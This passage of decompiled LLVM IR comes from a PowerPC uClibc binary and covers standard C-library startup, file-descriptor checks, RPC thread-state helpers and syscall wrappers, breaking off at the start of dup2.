  %v3_10020350 = load i32, i32* @global_var_10045238.1261, align 4
  %v3_10020354 = icmp eq i32 %v3_10020350, 0
  br i1 %v3_10020354, label %dec_label_pc_10020364, label %dec_label_pc_1002035c

dec_label_pc_1002035c:                            ; preds = %dec_label_pc_1002034c
  %v1_10020360 = call i32 @unknown_0()
  store i32 %v1_10020360, i32* @r3, align 4
  br label %dec_label_pc_10020364

dec_label_pc_10020364:                            ; preds = %dec_label_pc_1002034c, %dec_label_pc_1002035c
  %v3_10020368 = load i32, i32* @global_var_1004523c.1262, align 4
  %v3_1002036c = icmp eq i32 %v3_10020368, 0
  br i1 %v3_1002036c, label %dec_label_pc_10020364.dec_label_pc_1002037c_crit_edge, label %dec_label_pc_10020374

dec_label_pc_10020364.dec_label_pc_1002037c_crit_edge: ; preds = %dec_label_pc_10020364
  %v0_1002038c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1002037c

dec_label_pc_10020374:                            ; preds = %dec_label_pc_10020364
  %v1_10020378 = call i32 @unknown_0()
  br label %dec_label_pc_1002037c

dec_label_pc_1002037c:                            ; preds = %dec_label_pc_10020364.dec_label_pc_1002037c_crit_edge, %dec_label_pc_10020374
  %v0_1002038c = phi i32 [ %v0_1002038c.pre, %dec_label_pc_10020364.dec_label_pc_1002037c_crit_edge ], [ %v1_10020378, %dec_label_pc_10020374 ]
  ret i32 %v0_1002038c

; uselistorder directives
  uselistorder i32 ()* @unknown_0, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1002037c, { 1, 0 }
  uselistorder label %dec_label_pc_10020364, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10020398 = load i32, i32* @r3, align 4
  ret i32 %v0_10020398
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268567488, i32* @lr, align 4
  %v2_100203bc = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_100203c0 = icmp eq i32 %v2_100203bc, -1
  br i1 %v3_100203c0, label %dec_label_pc_100203c8, label %dec_label_pc_100203e8

dec_label_pc_100203c8:                            ; preds = %entry
  %v0_100203cc = load i32, i32* @r30, align 4
  store i32 %v0_100203cc, i32* @r4, align 4
  store i32 268567516, i32* @lr, align 4
  %v0_100203d8 = call i32 @__libc_open()
  %v1_100203dc = load i32, i32* @r31, align 4
  %v4_100203dc = icmp eq i32 %v0_100203d8, %v1_100203dc
  br i1 %v4_100203dc, label %dec_label_pc_100203e8, label %dec_label_pc_100203e4

dec_label_pc_100203e4:                            ; preds = %dec_label_pc_100203c8
  %v1_100203e4 = call i32 @abort(i32 %v0_100203d8)
  br label %dec_label_pc_100203e8

dec_label_pc_100203e8:                            ; preds = %entry, %dec_label_pc_100203c8, %dec_label_pc_100203e4
  %v0_100203f8 = phi i32 [ %v2_100203bc, %entry ], [ %v0_100203d8, %dec_label_pc_100203c8 ], [ %v1_100203e4, %dec_label_pc_100203e4 ]
  ret i32 %v0_100203f8

; uselistorder directives
  uselistorder i32 ()* @__libc_open, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_100203e8, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10020400 = load i32, i32* @lr, align 4
  %v3_10020418 = load i32, i32* @global_var_10045240.1264, align 4
  %v3_10020420 = icmp eq i32 %v3_10020418, 0
  br i1 %v3_10020420, label %dec_label_pc_10020444, label %entry.dec_label_pc_10020468_crit_edge

entry.dec_label_pc_10020468_crit_edge:            ; preds = %entry
  %v0_10020478.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10020468

dec_label_pc_10020444:                            ; preds = %entry
  store i32 1, i32* @global_var_10045240.1264, align 4
  store i32 4096, i32* @global_var_10045234.1005, align 4
  store i32 268567620, i32* @lr, align 4
  %v1_10020440 = call i32 @__pthread_initialize_minimal(i32 268697600)
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 -24052), i32 0), label %dec_label_pc_10020468, label %dec_label_pc_10020454

dec_label_pc_10020454:                            ; preds = %dec_label_pc_10020444
  store i32 %v0_10020400, i32* @lr, align 4
  %v1_10020464 = call i32 @_stdio_init(i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 -24052))
  br label %dec_label_pc_10020468

dec_label_pc_10020468:                            ; preds = %entry.dec_label_pc_10020468_crit_edge, %dec_label_pc_10020444, %dec_label_pc_10020454
  %v0_10020478 = phi i32 [ %v0_10020478.pre, %entry.dec_label_pc_10020468_crit_edge ], [ %v1_10020440, %dec_label_pc_10020444 ], [ %v1_10020464, %dec_label_pc_10020454 ]
  ret i32 %v0_10020478

; uselistorder directives
  uselistorder label %dec_label_pc_10020468, { 2, 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v1_1002048c = mul i32 %arg2, 4
  store i32 %tmp, i32* @r30, align 4
  %v2_10020498 = add i32 %tmp, %v1_1002048c
  %v0_1002049c = load i32, i32* @r9, align 4
  store i32 %v0_1002049c, i32* @global_var_1004522c.1265, align 4
  %v1_100204a0 = add i32 %v2_10020498, 4
  store i32 268697600, i32* %r29.global-to-local, align 4
  store i32 %v1_100204a0, i32* @global_var_10045230.1256, align 4
  store i32 %arg6, i32* @global_var_1004523c.1262, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  %v2_100204c4 = load i32, i32* %arg3, align 4
  %v4_100204c8 = icmp eq i32 %v1_100204a0, %v2_100204c4
  br i1 %v4_100204c8, label %dec_label_pc_100204d0, label %dec_label_pc_100204d4

dec_label_pc_100204d0:                            ; preds = %entry
  store i32 %v2_10020498, i32* @global_var_10045230.1256, align 4
  br label %dec_label_pc_100204d4

dec_label_pc_100204d4:                            ; preds = %entry, %dec_label_pc_100204d0
  %v2_100204d4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_100204d4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 120, i32* @r5, align 4
  store i32 268567780, i32* @lr, align 4
  %v0_100204e0 = call i32 @__GI_memset()
  %storemerge.pre = load i32, i32* @global_var_10045230.1256, align 4
  br label %dec_label_pc_100204f0

dec_label_pc_100204f0:                            ; preds = %dec_label_pc_100204f0, %dec_label_pc_100204d4
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_100204d4 ], [ %v1_100204f4, %dec_label_pc_100204f0 ]
  %v1_100204f0 = inttoptr i32 %storemerge to i32*
  %v2_100204f0 = load i32, i32* %v1_100204f0, align 4
  %v1_100204f4 = add i32 %storemerge, 4
  %v3_100204f8 = icmp eq i32 %v2_100204f0, 0
  br i1 %v3_100204f8, label %dec_label_pc_10020500, label %dec_label_pc_100204f0

dec_label_pc_10020500:                            ; preds = %dec_label_pc_100204f0
  store i32 %v1_100204f4, i32* %r29.global-to-local, align 4
  %v1_1002052c12 = inttoptr i32 %v1_100204f4 to i32*
  %v2_1002052c13 = load i32, i32* %v1_1002052c12, align 4
  %v3_1002053016 = icmp eq i32 %v2_1002052c13, 0
  br i1 %v3_1002053016, label %dec_label_pc_10020538, label %dec_label_pc_10020508

dec_label_pc_10020508:                            ; preds = %dec_label_pc_10020500, %dec_label_pc_10020528
  %v0_1002051c = phi i32 [ %v1_10020528, %dec_label_pc_10020528 ], [ %v1_100204f4, %dec_label_pc_10020500 ]
  %v0_10020510 = phi i32 [ %v2_1002052c, %dec_label_pc_10020528 ], [ %v2_1002052c13, %dec_label_pc_10020500 ]
  %v2_10020508 = icmp ugt i32 %v0_10020510, 14
  br i1 %v2_10020508, label %dec_label_pc_10020528, label %dec_label_pc_10020510

dec_label_pc_10020510:                            ; preds = %dec_label_pc_10020508
  %v1_10020510 = mul i32 %v0_10020510, 8
  %v2_10020518 = add i32 %v1_10020510, %v2_100204d4
  store i32 %v2_10020518, i32* @r3, align 4
  store i32 %v0_1002051c, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268567848, i32* @lr, align 4
  %v0_10020524 = call i32 @memcpy()
  %v0_10020528.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10020528

dec_label_pc_10020528:                            ; preds = %dec_label_pc_10020508, %dec_label_pc_10020510
  %v0_10020528 = phi i32 [ %v0_1002051c, %dec_label_pc_10020508 ], [ %v0_10020528.pre, %dec_label_pc_10020510 ]
  %v1_10020528 = add i32 %v0_10020528, 8
  store i32 %v1_10020528, i32* %r29.global-to-local, align 4
  %v1_1002052c = inttoptr i32 %v1_10020528 to i32*
  %v2_1002052c = load i32, i32* %v1_1002052c, align 4
  %v3_10020530 = icmp eq i32 %v2_1002052c, 0
  br i1 %v3_10020530, label %dec_label_pc_10020538, label %dec_label_pc_10020508

dec_label_pc_10020538:                            ; preds = %dec_label_pc_10020528, %dec_label_pc_10020500
  %v1_1002053c = call i32 @_dl_aux_init(i32 %v2_100204d4)
  store i32 %v1_1002053c, i32* @r3, align 4
  store i32 268567876, i32* @lr, align 4
  %v1_10020540 = call i32 @__GI___uClibc_init(i32 %v1_1002053c)
  %v3_10020548 = icmp eq i32 %tmp27, 0
  br i1 %v3_10020548, label %dec_label_pc_10020550, label %dec_label_pc_10020554

dec_label_pc_10020550:                            ; preds = %dec_label_pc_10020538
  br label %dec_label_pc_10020554

dec_label_pc_10020554:                            ; preds = %dec_label_pc_10020538, %dec_label_pc_10020550
  %v0_10020558 = phi i32 [ %tmp27, %dec_label_pc_10020538 ], [ 4096, %dec_label_pc_10020550 ]
  store i32 %v0_10020558, i32* @global_var_10045234.1005, align 4
  %v3_10020560 = icmp eq i32 %tmp26, -1
  br i1 %v3_10020560, label %dec_label_pc_10020568, label %dec_label_pc_1002059c

dec_label_pc_10020568:                            ; preds = %dec_label_pc_10020554
  store i32 268567916, i32* @lr, align 4
  %v1_10020568 = call i32 @getuid(i32 268697600)
  store i32 %v1_10020568, i32* %r29.global-to-local, align 4
  store i32 268567924, i32* @lr, align 4
  %v0_10020570 = call i32 @geteuid()
  %v4_10020574 = icmp eq i32 %v1_10020568, %v0_10020570
  br i1 %v4_10020574, label %dec_label_pc_1002057c, label %dec_label_pc_100205b8

dec_label_pc_1002057c:                            ; preds = %dec_label_pc_10020568
  store i32 268567936, i32* @lr, align 4
  %v1_1002057c = call i32 @getgid(i32 %v0_10020570)
  store i32 %v1_1002057c, i32* %r29.global-to-local, align 4
  store i32 268567944, i32* @lr, align 4
  %v0_10020584 = call i32 @getegid()
  %v4_10020588 = icmp eq i32 %v1_1002057c, %v0_10020584
  br i1 %v4_10020588, label %dec_label_pc_10020590.thread, label %dec_label_pc_100205b8

dec_label_pc_10020590.thread:                     ; preds = %dec_label_pc_1002057c
  br label %dec_label_pc_100205e8

dec_label_pc_1002059c:                            ; preds = %dec_label_pc_10020554
  %v4_100205a0 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_100205a0, label %dec_label_pc_100205a8, label %dec_label_pc_100205b8

dec_label_pc_100205a8:                            ; preds = %dec_label_pc_1002059c
  br label %dec_label_pc_100205b8

dec_label_pc_100205b8:                            ; preds = %dec_label_pc_100205a8, %dec_label_pc_1002059c, %dec_label_pc_1002057c, %dec_label_pc_10020568
  store i32 268568008, i32* @lr, align 4
  %v2_100205c4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268568024, i32* @lr, align 4
  %v2_100205d4 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268568040, i32* @lr, align 4
  %v2_100205e4 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_100205e8

dec_label_pc_100205e8:                            ; preds = %dec_label_pc_10020590.thread, %dec_label_pc_100205b8
  %v0_100205e8 = load i32, i32* @r30, align 4
  %v1_100205e8 = inttoptr i32 %v0_100205e8 to i32*
  %v2_100205e8 = load i32, i32* %v1_100205e8, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_100205e8, i32* inttoptr (i32 268718388 to i32*), align 4
  %v0_10020614 = load i32, i32* @r27, align 4
  store i32 %v0_10020614, i32* @global_var_10045238.1261, align 4
  br i1 false, label %dec_label_pc_1002061c, label %dec_label_pc_10020694

dec_label_pc_1002061c:                            ; preds = %dec_label_pc_100205e8, %dec_label_pc_1002061c
  br i1 undef, label %dec_label_pc_1002061c, label %dec_label_pc_10020694

dec_label_pc_10020694:                            ; preds = %dec_label_pc_1002061c, %dec_label_pc_100205e8
  %v0_10020640 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10020640)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_100206a4 = call i32 @__errno_location()
  %v2_100206ac = inttoptr i32 %v0_100206a4 to i32*
  store i32 0, i32* %v2_100206ac, align 4
  %v1_100206c0 = call i32 @__h_errno_location(i32 268513136)
  %v2_100206c8 = inttoptr i32 %v1_100206c0 to i32*
  store i32 0, i32* %v2_100206c8, align 4
  %v0_100206d8 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_100206d8)
  %v0_100206e4 = call i32 @__GI_exit()
  ret i32 %v0_100206e4

; uselistorder directives
  uselistorder i32 %v2_1002052c, { 1, 0 }
  uselistorder i32 %v1_10020528, { 2, 1, 0 }
  uselistorder i32 %v1_100204f4, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_100204d4, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1002061c, { 1, 0 }
  uselistorder label %dec_label_pc_100205e8, { 1, 0 }
  uselistorder label %dec_label_pc_10020554, { 1, 0 }
  uselistorder label %dec_label_pc_10020528, { 1, 0 }
  uselistorder label %dec_label_pc_10020508, { 1, 0 }
  uselistorder label %dec_label_pc_100204d4, { 1, 0 }
}

define i32 @rpc_thread_multi(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10020714 = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_1004da2c.1268 to i32), i32 268533252)
  ret i32 %v3_10020714
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v2_10020758 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268533236)
  %v3_10020768 = icmp eq i32 %v2_10020758, 0
  store i32 %v2_10020758, i32* %r31.global-to-local, align 4
  br i1 %v3_10020768, label %dec_label_pc_10020774, label %dec_label_pc_1002084c

dec_label_pc_10020774:                            ; preds = %entry
  store i32 268697600, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10020798.1273 to i32), i32* @lr, align 4
  %v4_10020794 = call i32 @pthread_once(i32* nonnull @global_var_10045244.1272, i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 1768), i32 268528284)
  %v2_100207c8 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268533236)
  %v3_100207d8 = icmp eq i32 %v2_100207c8, 0
  store i32 %v2_100207c8, i32* %r31.global-to-local, align 4
  br i1 %v3_100207d8, label %dec_label_pc_100207e4, label %dec_label_pc_1002084c

dec_label_pc_100207e4:                            ; preds = %dec_label_pc_10020774
  store i32 268568560, i32* @lr, align 4
  %v2_100207ec = call i32 @calloc(i32 1, i32 200)
  store i32 %v2_100207ec, i32* %r31.global-to-local, align 4
  %v3_100207f0 = icmp eq i32 %v2_100207ec, 0
  br i1 %v3_100207f0, label %dec_label_pc_10020824, label %dec_label_pc_100207f8

dec_label_pc_100207f8:                            ; preds = %dec_label_pc_100207e4
  %v3_10020810 = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v2_100207ec, i32 268533252)
  %v0_10020850.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1002084c

dec_label_pc_10020824:                            ; preds = %dec_label_pc_100207e4
  %v2_10020838 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268533236)
  store i32 %v2_10020838, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1002084c

dec_label_pc_1002084c:                            ; preds = %dec_label_pc_10020774, %entry, %dec_label_pc_100207f8, %dec_label_pc_10020824
  %v0_10020850 = phi i32 [ %v2_100207c8, %dec_label_pc_10020774 ], [ %v2_10020758, %entry ], [ %v0_10020850.pre, %dec_label_pc_100207f8 ], [ %v2_10020838, %dec_label_pc_10020824 ]
  ret i32 %v0_10020850

; uselistorder directives
  uselistorder label %dec_label_pc_1002084c, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  store i32 268568692, i32* @lr, align 4
  %v0_10020870 = call i32 @__rpc_thread_variables()
  %v4_1002087c = icmp eq i32 %v0_10020870, ptrtoint (i32* @global_var_1004da2c.1268 to i32)
  %v1_10020880 = add i32 %v0_10020870, 148
  br i1 %v4_1002087c, label %dec_label_pc_10020888, label %dec_label_pc_10020890

dec_label_pc_10020888:                            ; preds = %entry
  br label %dec_label_pc_10020890

dec_label_pc_10020890:                            ; preds = %entry, %dec_label_pc_10020888
  %v0_1002089c = phi i32 [ %v1_10020880, %entry ], [ ptrtoint (i32* @global_var_10045250.1278 to i32), %dec_label_pc_10020888 ]
  ret i32 %v0_1002089c

; uselistorder directives
  uselistorder label %dec_label_pc_10020890, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  store i32 268568752, i32* @lr, align 4
  %v0_100208ac = call i32 @__rpc_thread_variables()
  %v4_100208b8 = icmp eq i32 %v0_100208ac, ptrtoint (i32* @global_var_1004da2c.1268 to i32)
  %v1_100208bc = add i32 %v0_100208ac, 144
  br i1 %v4_100208b8, label %dec_label_pc_100208c4, label %dec_label_pc_100208cc

dec_label_pc_100208c4:                            ; preds = %entry
  br label %dec_label_pc_100208cc

dec_label_pc_100208cc:                            ; preds = %entry, %dec_label_pc_100208c4
  %v0_100208d8 = phi i32 [ ptrtoint (i32* @global_var_10045254.1279 to i32), %dec_label_pc_100208c4 ], [ %v1_100208bc, %entry ]
  %storemerge = phi i32 [ 268697600, %dec_label_pc_100208c4 ], [ ptrtoint (i32* @global_var_1004da2c.1268 to i32), %entry ]
  store i32 %storemerge, i32* @r9, align 4
  ret i32 %v0_100208d8

; uselistorder directives
  uselistorder label %dec_label_pc_100208cc, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  store i32 268568812, i32* @lr, align 4
  %v0_100208e8 = call i32 @__rpc_thread_variables()
  %v4_100208f4 = icmp eq i32 %v0_100208e8, ptrtoint (i32* @global_var_1004da2c.1268 to i32)
  %v1_100208f8 = add i32 %v0_100208e8, 128
  br i1 %v4_100208f4, label %dec_label_pc_10020900, label %dec_label_pc_10020908

dec_label_pc_10020900:                            ; preds = %entry
  br label %dec_label_pc_10020908

dec_label_pc_10020908:                            ; preds = %entry, %dec_label_pc_10020900
  %v0_10020914 = phi i32 [ %v1_100208f8, %entry ], [ ptrtoint (i32* @global_var_1004eec4.1280 to i32), %dec_label_pc_10020900 ]
  ret i32 %v0_10020914

; uselistorder directives
  uselistorder label %dec_label_pc_10020908, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268568872, i32* @lr, align 4
  %v0_10020924 = call i32 @__rpc_thread_variables()
  %v4_10020930 = icmp eq i32 %v0_10020924, ptrtoint (i32* @global_var_1004da2c.1268 to i32)
  br i1 %v4_10020930, label %dec_label_pc_10020938, label %dec_label_pc_10020940

dec_label_pc_10020938:                            ; preds = %entry
  br label %dec_label_pc_10020940

dec_label_pc_10020940:                            ; preds = %entry, %dec_label_pc_10020938
  %v0_1002094c = phi i32 [ %v0_10020924, %entry ], [ ptrtoint (i32* @global_var_1004ee38.1281 to i32), %dec_label_pc_10020938 ]
  ret i32 %v0_1002094c

; uselistorder directives
  uselistorder label %dec_label_pc_10020940, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %v2_10020974 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268533236)
  store i32 %v2_10020974, i32* @r31, align 4
  %v3_1002098c = icmp eq i32 %v2_10020974, 0
  %v4_10020994 = icmp eq i32 %v2_10020974, ptrtoint (i32* @global_var_1004da2c.1268 to i32)
  %brmerge = or i1 %v4_10020994, %v3_1002098c
  br i1 %brmerge, label %dec_label_pc_10020a08, label %dec_label_pc_100209a0

dec_label_pc_100209a0:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_100209a4.1282 to i32), i32* @lr, align 4
  %v1_100209a0 = call i32 @__rpc_thread_svc_cleanup(i32 ptrtoint (i32* @global_var_1004da2c.1268 to i32))
  store i32 268569000, i32* @lr, align 4
  %v1_100209a4 = call i32 @__rpc_thread_clnt_cleanup(i32 %v1_100209a0)
  %v0_100209a8 = load i32, i32* @r31, align 4
  %v1_100209a8 = add i32 %v0_100209a8, 152
  %v2_100209a8 = inttoptr i32 %v1_100209a8 to i32*
  %v3_100209a8 = load i32, i32* %v2_100209a8, align 4
  store i32 %v3_100209a8, i32* @r3, align 4
  store i32 268569008, i32* @lr, align 4
  %v0_100209ac = call i32 @free()
  %v0_100209b0 = load i32, i32* @r31, align 4
  %v1_100209b0 = add i32 %v0_100209b0, 156
  %v2_100209b0 = inttoptr i32 %v1_100209b0 to i32*
  %v3_100209b0 = load i32, i32* %v2_100209b0, align 4
  store i32 %v3_100209b0, i32* @r3, align 4
  store i32 268569016, i32* @lr, align 4
  %v0_100209b4 = call i32 @free()
  %v0_100209b8 = load i32, i32* @r31, align 4
  %v1_100209b8 = add i32 %v0_100209b8, 160
  %v2_100209b8 = inttoptr i32 %v1_100209b8 to i32*
  %v3_100209b8 = load i32, i32* %v2_100209b8, align 4
  store i32 %v3_100209b8, i32* @r3, align 4
  store i32 268569024, i32* @lr, align 4
  %v0_100209bc = call i32 @free()
  %v0_100209c0 = load i32, i32* @r31, align 4
  %v1_100209c0 = add i32 %v0_100209c0, 188
  %v2_100209c0 = inttoptr i32 %v1_100209c0 to i32*
  %v3_100209c0 = load i32, i32* %v2_100209c0, align 4
  store i32 %v3_100209c0, i32* @r3, align 4
  store i32 268569032, i32* @lr, align 4
  %v0_100209c4 = call i32 @free()
  %v0_100209c8 = load i32, i32* @r31, align 4
  %v1_100209c8 = add i32 %v0_100209c8, 172
  %v2_100209c8 = inttoptr i32 %v1_100209c8 to i32*
  %v3_100209c8 = load i32, i32* %v2_100209c8, align 4
  store i32 %v3_100209c8, i32* @r3, align 4
  store i32 268569040, i32* @lr, align 4
  %v0_100209cc = call i32 @free()
  %v0_100209d0 = load i32, i32* @r31, align 4
  %v1_100209d0 = add i32 %v0_100209d0, 176
  %v2_100209d0 = inttoptr i32 %v1_100209d0 to i32*
  %v3_100209d0 = load i32, i32* %v2_100209d0, align 4
  store i32 %v3_100209d0, i32* @r3, align 4
  store i32 268569048, i32* @lr, align 4
  %v0_100209d4 = call i32 @free()
  %v0_100209d8 = load i32, i32* @r31, align 4
  store i32 %v0_100209d8, i32* @r3, align 4
  store i32 268569056, i32* @lr, align 4
  %v0_100209dc = call i32 @free()
  %v3_100209f8 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 268500992)
  br label %dec_label_pc_10020a08

dec_label_pc_10020a08:                            ; preds = %entry, %dec_label_pc_100209a0
  %v0_10020a18 = phi i32 [ %v2_10020974, %entry ], [ %v3_100209f8, %dec_label_pc_100209a0 ]
  ret i32 %v0_10020a18

; uselistorder directives
  uselistorder i32 %v2_10020974, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1004da2c.1268 to i32), { 1, 3, 4, 5, 0, 6, 7, 2 }
  uselistorder i32 (i32, i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder i32 268533236, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10020a08, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10020a20 = load i32, i32* @lr, align 4
  %v0_10020a28 = load i32, i32* @r3, align 4
  store i32 %v0_10020a28, i32* @r29, align 4
  %v0_10020a30 = call i32 @__errno_location()
  %v0_10020a34 = load i32, i32* @r29, align 4
  %v2_10020a34 = inttoptr i32 %v0_10020a30 to i32*
  store i32 %v0_10020a34, i32* %v2_10020a34, align 4
  store i32 %v0_10020a20, i32* @lr, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10020aa8 = add i32 %tmp, 84
  %v2_10020aa8 = inttoptr i32 %v1_10020aa8 to i32*
  %v3_10020aa8 = load i32, i32* %v2_10020aa8, align 4
  %v1_10020ac4 = call %0 @__asm_mtcrf(i32 255, i32 %v3_10020aa8)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10020b08 = load i32, i32* @lr, align 4
  %v1_10020b08 = load i1, i1* @cr0_so, align 1
  %v2_10020b08 = xor i1 %v1_10020b08, true
  call void @__pseudo_cond_branch(i1 %v2_10020b08, i32 %v0_10020b08)
  %v0_10020b0c = call i32 @__syscall_error()
  ret i32 %v0_10020b0c
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020b28 = call i32 @__asm_mfcr()
  %v1_10020b2c = and i32 %v0_10020b28, 268435456
  %v3_10020b2c = icmp eq i32 %v1_10020b2c, 0
  store i32 %v0_10020b28, i32* %r31.global-to-local, align 4
  br i1 %v3_10020b2c, label %dec_label_pc_10020b44, label %dec_label_pc_10020b38

dec_label_pc_10020b38:                            ; preds = %entry
  %v0_10020b38 = call i32 @__errno_location()
  %v0_10020b3c = load i32, i32* %r31.global-to-local, align 4
  %v2_10020b3c = inttoptr i32 %v0_10020b38 to i32*
  store i32 %v0_10020b3c, i32* %v2_10020b3c, align 4
  br label %dec_label_pc_10020b44

dec_label_pc_10020b44:                            ; preds = %entry, %dec_label_pc_10020b38
  %v0_10020b54 = phi i32 [ %v0_10020b28, %entry ], [ -1, %dec_label_pc_10020b38 ]
  ret i32 %v0_10020b54

; uselistorder directives
  uselistorder label %dec_label_pc_10020b44, { 1, 0 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020b70 = call i32 @__asm_mfcr()
  %v1_10020b74 = and i32 %v0_10020b70, 268435456
  store i32 %v1_10020b74, i32* @r9, align 4
  %v3_10020b74 = icmp eq i32 %v1_10020b74, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10020b70, i32* %r31.global-to-local, align 4
  br i1 %v3_10020b74, label %dec_label_pc_10020b8c, label %dec_label_pc_10020b80

dec_label_pc_10020b80:                            ; preds = %entry
  %v0_10020b80 = call i32 @__errno_location()
  %v0_10020b84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10020b84 = inttoptr i32 %v0_10020b80 to i32*
  store i32 %v0_10020b84, i32* %v2_10020b84, align 4
  br label %dec_label_pc_10020b8c

dec_label_pc_10020b8c:                            ; preds = %entry, %dec_label_pc_10020b80
  %v0_10020b9c = phi i32 [ %v0_10020b70, %entry ], [ -1, %dec_label_pc_10020b80 ]
  ret i32 %v0_10020b9c

; uselistorder directives
  uselistorder i1* @cr0_so, { 7, 5, 6, 10, 11, 12, 4, 8, 9, 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10020b8c, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10020bb8 = call i32 @__asm_mfcr()
  %v1_10020bbc = and i32 %v0_10020bb8, 268435456
  %v3_10020bbc = icmp eq i32 %v1_10020bbc, 0
  store i32 %v0_10020bb8, i32* %r31.global-to-local, align 4
  br i1 %v3_10020bbc, label %dec_label_pc_10020bd4, label %dec_label_pc_10020bc8

dec_label_pc_10020bc8:                            ; preds = %entry
  %v0_10020bc8 = call i32 @__errno_location()
  %v0_10020bcc = load i32, i32* %r31.global-to-local, align 4
  %v2_10020bcc = inttoptr i32 %v0_10020bc8 to i32*
  store i32 %v0_10020bcc, i32* %v2_10020bcc, align 4
  br label %dec_label_pc_10020bd4

dec_label_pc_10020bd4:                            ; preds = %entry, %dec_label_pc_10020bc8
  %v0_10020be4 = phi i32 [ %v0_10020bb8, %entry ], [ -1, %dec_label_pc_10020bc8 ]
  ret i32 %v0_10020be4

; uselistorder directives
  uselistorder label %dec_label_pc_10020bd4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
